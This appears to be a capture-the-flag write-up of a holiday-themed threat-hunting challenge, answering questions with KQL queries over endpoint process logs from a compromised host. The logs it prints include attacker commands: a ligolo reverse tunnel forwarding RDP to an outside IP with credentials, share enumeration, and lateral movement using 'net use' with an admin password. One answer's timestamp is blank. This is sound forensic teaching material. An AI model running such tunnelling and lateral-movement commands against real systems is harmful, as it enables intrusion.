<h1>Intro</h1>

**A compromised host! Time for a deep dive.**

Well, that's not good. It looks like Alabaster clicked on the link and downloaded a suspicious file. I don't know exactly what giftwrap.exe does, but it seems bad.

Can you take a closer look at endpoint data from Alabaster's machine? We need to figure out exactly what happened here. Word of this hack is starting to spread to the other elves, so work quickly and quietly!



<h3>Question</h3> 
The attacker created an reverse tunnel connection with the compromised machine. What IP was the connection forwarded to?



**Query**

```
let ClickTime = datetime(2023-12-02T10:12:42Z);
ProcessEvents
| where timestamp > ClickTime
| where hostname == 'Y1US-DESKTOP'
```

**Result**
```
"timestamp": 2023-12-02T11:11:29Z,
"parent_process_name": cmd.exe,
"parent_process_hash": 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,
"process_commandline": "ligolo" --bind 0.0.0.0:1251 --forward 127.0.0.1:3389 --to 113.37.9.17:22 --username rednose --password falalalala --no-antispoof,
"process_name": ligolo,
"process_hash": e9b34c42e29a349620a1490574b87865cc1571f65aa376b928701a034e6b3533,
"hostname": Y1US-DESKTOP,
"username": alsnowball

```

<h3>Question</h3> 
What is the timestamp when the attackers enumerated network shares on the machine?


**Result**

```
"timestamp":    ,
"parent_process_name": cmd.exe,
"parent_process_hash": 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,
"process_commandline": net share,
"process_name": net.exe,
"process_hash": 8b5b1556ba468035a37b40d8ea42a4bff252f4502b97c52fcacb3ba269527a57,
"hostname": Y1US-DESKTOP,
"username": alsnowball

```


<h3>Question</h3> 
What was the hostname of the system the attacker moved laterally to?

**Query**

```
let ClickTime = datetime(2023-12-02T10:12:42Z);
ProcessEvents
| where timestamp > ClickTime
| where hostname == 'Y1US-DESKTOP'
| where process_commandline has "net"
```

**Result**
```
"timestamp": 2023-12-24T15:14:25Z,
"parent_process_name": cmd.exe,
"parent_process_hash": 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,
"process_commandline": cmd.exe /C net use \\NorthPolefileshare\c$ /user:admin AdminPass123,
"process_name": cmd.exe,
"process_hash": bfc3e1967ffe2b1e6752165a94f7f84a216300711034b2c64b1e440a54e91793,
"hostname": Y1US-DESKTOP,
"username": alsnowball
```




